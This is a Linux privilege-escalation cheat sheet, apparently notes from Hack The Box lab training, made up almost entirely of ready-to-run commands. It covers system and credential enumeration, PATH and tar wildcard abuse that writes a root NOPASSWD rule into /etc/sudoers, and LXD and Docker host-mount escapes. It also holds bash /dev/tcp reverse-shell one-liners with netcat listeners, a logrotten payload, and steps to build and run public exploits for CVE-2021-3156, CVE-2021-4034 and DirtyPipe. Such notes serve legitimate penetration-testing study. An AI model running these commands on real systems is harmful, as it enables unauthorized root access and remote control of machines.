### Enumeration
```
whoami
id
hostname
ifconfig
sudo -l -l
sudo -V
ps aux
ps au
history
ls -al /etc/cron.daily
lsblk
df -h
echo $PATH
env
uname -a
lscpu
route
netstat -rn
arp -a
getent group <group>
ip a
lastlog
w
cat /etc/fstab | grep -v "#" | column -t
cat /etc/os-release
cat /etc/resolv.conf
cat /etc/hosts
cat /etc/group
cat /etc/shells
cat /etc/fstab
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -type d -name ".*" -ls 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```
###### Credentials
```
grep 'DB_USER\|DB_PASSWORD' wp-config.php
ls ~/.ssh
```
###### Path Abuse
```
echo $PATH
#add cwd to PATH
PATH=.:${PATH}
export $PATH
```
###### Wildcard Abuse
```
#cron job
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
#use wildcard to leverage tar execution to use file name as a command and change sudo perms to all for htb-student
```
###### GTFOBins
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -4000 2>/dev/null
```
### Privileged Groups
###### LXC/LXD Container Manager
```
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
```
###### Docker
```
docker run -v /root:/mnt -it ubuntu

docker run --rm -d --privileged -v /:/hostsystem main_app
docker ps
```
### Capabilities
```
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

getcap /usr/bin/vim.basic
```
### Cron Jobs
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

./pspy64 -pf -i 1000
#one-liner to add to file
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
nc -lnvp 443
```
### Logrotate (Logrotten)
```
git clone https://github.com/whotwagner/logrotten.git
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
nc -nlvp 9001
./logrotten -p ./payload /tmp/tmp.log
```
### Showmount
```
showmount -e <IP>
cat /etc/exports
```
### Kernel Exploits
```
uname -a
cat /etc/lsb-release 
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```
### Shared Object Hijacking
```
ldd payroll
readelf -d payroll  | grep PATH
ls -la /development/
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll 
```
### Recent Exploits
###### sudo
```
#CVE-2021-3156
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 1

#sudo bypass
sudo -u#-1 id
```
###### Polkit
```
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```
###### DirtyPipe
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```